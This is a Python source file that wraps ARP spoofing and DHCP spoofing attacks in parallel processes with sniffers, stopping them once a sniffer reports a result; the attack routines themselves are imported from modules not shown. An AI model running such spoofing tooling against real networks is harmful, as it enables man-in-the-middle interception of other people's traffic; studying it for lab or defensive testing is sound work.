from multiprocessing import Process, Manager
from attacks import do_arp_spoofing, DhcpSpoofing
from sniffers import do_arp_sniffer, DhcpSniffer
from dhcp_sends_packets import DhcpSendsPackets
from time import sleep


class MultiprocessingAttacksWrapper:
    def arp_spoofing(self, ip_target=str, ip_gateway=str, verbose=bool):
        manager = Manager()
        shared_dict = manager.dict()

        arp_spoofing_process = Process(
            target=do_arp_spoofing,
            args=(shared_dict, ip_target, ip_gateway, verbose,)
        )

        arp_sniffer_process = Process(target=do_arp_sniffer, args=(shared_dict,))

        arp_spoofing_process.start()
        arp_sniffer_process.start()

        while True:
            sleep(3)
            if not shared_dict.get("condition_sniffer"):
                continue

            print(shared_dict)
            arp_sniffer_process.kill()
            print("kill sniffer process")
            arp_spoofing_process.kill()
            print("kill arp_spoofing process")
            return shared_dict.get("condition_sniffer")

    def dhcp_spoofing(self, network_interface: str, host_ip_address):
        manager = Manager()
        shared_dict = manager.dict()

        dhcp_spoofing = DhcpSpoofing(network_interface, host_ip_address)
        dhcp_sniffer = DhcpSniffer(network_interface)
        dhcp_sends_packets = DhcpSendsPackets(network_interface)

        dhcp_spoofing_process = Process(
            target=dhcp_spoofing.start_dhcp_spoofing
        )

        dhcp_sniffer_process = Process(
            target=dhcp_sniffer.start_dhcp_shiffer,
            args=(shared_dict,)
        )

        send_dhcp_packet_process = Process(
            target=dhcp_sends_packets.send_dhcp_discover_packet,
        )

        print(shared_dict)

        dhcp_spoofing_process.start()
        sleep(1)
        dhcp_sniffer_process.start()
        sleep(1)
        send_dhcp_packet_process.start()

        print(shared_dict)

        while True:
            sleep(1)
            if not shared_dict.get("condition_sniffer"):
                continue

            print(shared_dict)
            dhcp_spoofing_process.kill()
            print("kill dhcp spoofing process")
            dhcp_sniffer_process.kill()
            print("kill dhcp sniffer process")
            send_dhcp_packet_process.kill()
            print("kill dhcp send packet")

            return shared_dict.get("condition_sniffer")